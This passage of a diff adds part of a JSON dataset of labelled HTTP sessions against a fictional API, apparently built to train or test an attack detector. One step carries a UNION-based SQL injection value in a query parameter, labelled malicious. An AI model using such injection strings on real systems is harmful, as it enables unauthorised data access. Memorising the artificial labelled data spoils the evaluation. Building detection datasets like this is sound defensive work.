+    "client_ip": "192.168.2.16",
+    "steps": [
+      {
+        "id": "sess097-s01",
+        "label": "suspicious_benign",
+        "method": "GET",
+        "path": "/v1/stations/public",
+        "query": {},
+        "headers": {
+          "Accept": "application/json",
+          "User-Agent": "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; .NET CLR 1.0.3705)"
+        },
+        "body": null,
+        "note": "The client uses an old browser user agent string."
+      },
+      {
+        "id": "sess097-s02",
+        "label": "benign",
+        "method": "POST",
+        "path": "/v1/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "acoustician97@riftnote.internal",
+          "password": "Password123!"
+        },
+        "note": "The user logs in."
+      },
+      {
+        "id": "sess097-s03",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/anomalies",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_097"
+        },
+        "body": null,
+        "note": "The user lists anomalies."
+      },
+      {
+        "id": "sess097-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/anomalies/anomaly-pi-06",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_097"
+        },
+        "body": null,
+        "note": "The user checks an anomaly record."
+      }
+    ]
+  },
+  {
+    "session_id": "sess098",
+    "client_ip": "192.168.2.17",
+    "steps": [
+      {
+        "id": "sess098-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/v1/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "acoustician98@riftnote.internal",
+          "password": "Password123!"
+        },
+        "note": "The user logs in."
+      },
+      {
+        "id": "sess098-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/anomalies",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_098"
+        },
+        "body": null,
+        "note": "The user lists anomalies."
+      },
+      {
+        "id": "sess098-s03",
+        "label": "malicious",
+        "method": "GET",
+        "path": "/v1/anomalies",
+        "query": {
+          "limit": "10 UNION SELECT 1,2,3"
+        },
+        "headers": {
+          "Authorization": "Bearer token_098"
+        },
+        "body": null,
+        "note": "The client attempts a UNION-based query injection."
+      },
+      {
+        "id": "sess098-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/anomalies/anomaly-rho-03",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_098"
+        },
+        "body": null,
+        "note": "The user checks an anomaly record."
+      }
+    ]
+  },
+  {
+    "session_id": "sess099",
+    "client_ip": "192.168.2.18",
+    "steps": [
+      {
+        "id": "sess099-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/v1/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "acoustician99@riftnote.internal",
+          "password": "Password123!"
+        },
+        "note": "The user logs in."
+      },
+      {
+        "id": "sess099-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/anomalies",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_099"
+        },
+        "body": null,
+        "note": "The user lists anomalies."
+      },
+      {
+        "id": "sess099-s03",
+        "label": "suspicious_benign",
+        "method": "GET",
+        "path": "/v1/anomalies/anomaly-unauthorized-44",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_099"
+        },
+        "body": null,
+        "note": "Data error: relabeled from malicious. One authenticated GET. The word unauthorized is only part of the id string."
+      },
+      {
+        "id": "sess099-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/anomalies/anomaly-sigma-04",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_099"
+        },
+        "body": null,
+        "note": "The user views a valid anomaly record."
+      }
+    ]
+  },
+  {
+    "session_id": "sess100",
+    "client_ip": "192.168.2.19",
+    "steps": [
+      {
+        "id": "sess100-s01",
+        "label": "suspicious_benign",
+        "method": "GET",
+        "path": "/v1/stations/public",
+        "query": {
+          "region": "Rift's bottom"
+        },
+        "headers": {
+          "Accept": "application/json"
+        },
+        "body": null,
+        "note": "The client includes an apostrophe in the region query parameter."
+      },
+      {
+        "id": "sess100-s02",
+        "label": "benign",
+        "method": "POST",
+        "path": "/v1/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "acoustician100@riftnote.internal",
+          "password": "Password123!"
+        },
+        "note": "The user logs in."
+      },
+      {
+        "id": "sess100-s03",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/anomalies",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_100"
+        },
+        "body": null,
+        "note": "The user lists anomalies."
+      },
+      {
+        "id": "sess100-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/anomalies/anomaly-tau-05",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_100"
+        },
+        "body": null,
+        "note": "The user inspects an anomaly record."
+      }
+    ]
+  }
+]
